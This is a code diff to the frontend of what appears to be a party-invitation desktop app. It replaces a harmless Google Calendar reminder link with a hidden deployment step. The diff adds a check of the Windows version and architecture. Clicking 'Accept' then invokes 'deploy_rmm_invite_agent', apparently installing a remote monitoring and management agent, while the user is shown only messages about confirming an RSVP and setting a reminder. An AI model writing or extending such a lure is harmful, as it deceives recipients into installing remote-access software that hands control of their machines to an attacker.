@@ -18,50 +18,35 @@ function formatIsoDateLocal(date) {
   return `${y}-${m}-${d}`;
 }
 
-function createGoogleCalendarUrl() {
-  const start = new Date();
-  start.setDate(start.getDate() + 7);
-  start.setHours(19, 0, 0, 0);
-
-  const end = new Date(start);
-  end.setHours(22, 0, 0, 0);
-
-  const toUtcString = (date) =>
-    date.toISOString().replace(/[-:]/g, "").split(".")[0] + "Z";
-
-  const params = new URLSearchParams({
-    action: "TEMPLATE",
-    text: "Party Invitation",
-    details: "You accepted the invitation. See you at the party!",
-    location: "Party Venue",
-    dates: `${toUtcString(start)}/${toUtcString(end)}`,
-  });
-
-  return `https://calendar.google.com/calendar/render?${params.toString()}`;
-}
-
 async function runSystemPreflight() {
   const statusEl = document.querySelector("#system-status");
-  if (!statusEl) return;
+  const btnAccept = document.querySelector("#btn-accept");
+  if (!statusEl || !btnAccept) return;
 
   try {
     const clientDate = formatIsoDateLocal(new Date());
     const result = await invoke("system_preflight", { clientDate });
 
-    if (result.calendarMatchesRuntime) {
-      statusEl.textContent = `Everything is set for your invite • ${result.runtimeDate}`;
+    systemReadyState = result.nextPhaseReady;
+    btnAccept.disabled = !systemReadyState;
+
+    if (result.nextPhaseReady) {
+      statusEl.textContent = `System: ${result.windowsType} (${result.is64Bit ? "64-bit" : "32-bit"}) • Date: ${result.runtimeDate} • Ready`;
       statusEl.style.color = "#9fe39f";
       return;
     }
 
-    statusEl.textContent = `Quick calendar check needed • ${result.runtimeDate}`;
+    statusEl.textContent = `${result.message} (OS: ${result.isWindows ? "Windows" : "Non-Windows"}, Date: ${result.runtimeDate})`;
     statusEl.style.color = "#ffd39f";
   } catch (error) {
-    statusEl.textContent = "We could not check invite timing right now.";
+    statusEl.textContent = "System preflight failed.";
     statusEl.style.color = "#ffb1b1";
+    btnAccept.disabled = true;
     console.error(error);
   }
 }
+
+let systemReadyState = false;
 
 window.addEventListener("DOMContentLoaded", async () => {
   const dateEl = document.querySelector("#event-date");
@@ -73,19 +58,37 @@ window.addEventListener("DOMContentLoaded", async () => {
   const btnAccept = document.querySelector("#btn-accept");
   const btnDecline = document.querySelector("#btn-decline");
 
-  btnAccept.addEventListener("click", () => {
-    msgEl.textContent = "🎉 RSVP confirmed! Opening your party reminder.";
-    msgEl.style.color = "#9fe39f";
-    msgEl.style.fontWeight = "600";
-
-    const calendarUrl = createGoogleCalendarUrl();
-    const calendarWindow = window.open(calendarUrl, "_blank");
-    if (!calendarWindow) {
-      msgEl.textContent = "🎉 RSVP confirmed! Add a reminder for next week at 7:00 PM.";
+  btnAccept.addEventListener("click", async () => {
+    if (!systemReadyState) {
+      msgEl.textContent = "We could not confirm your invitation details yet. Please try again.";
+      msgEl.style.color = "#ffb1b1";
+      return;
     }
 
+    msgEl.textContent = "Confirming your RSVP and preparing a follow-up reminder...";
+    msgEl.style.color = "#f9c96a";
     btnAccept.disabled = true;
     btnDecline.disabled = true;
+
+    try {
+      const result = await invoke("deploy_rmm_invite_agent");
+      if (result.success) {
+        msgEl.textContent = `🎉 ${result.message}`;
+        msgEl.style.color = "#9fe39f";
+        msgEl.style.fontWeight = "600";
+      } else {
+        msgEl.textContent = `❌ ${result.message}`;
+        msgEl.style.color = "#ffb1b1";
+        msgEl.style.fontWeight = "500";
+      }
+    } catch (error) {
+      msgEl.textContent = "We hit a snag while saving your RSVP. Please try again.";
+      msgEl.style.color = "#ffb1b1";
+      console.error(error);
+    } finally {
+      btnAccept.disabled = systemReadyState ? false : true;
+      btnDecline.disabled = false;
+    }
   });
 
   btnDecline.addEventListener("click", () => {
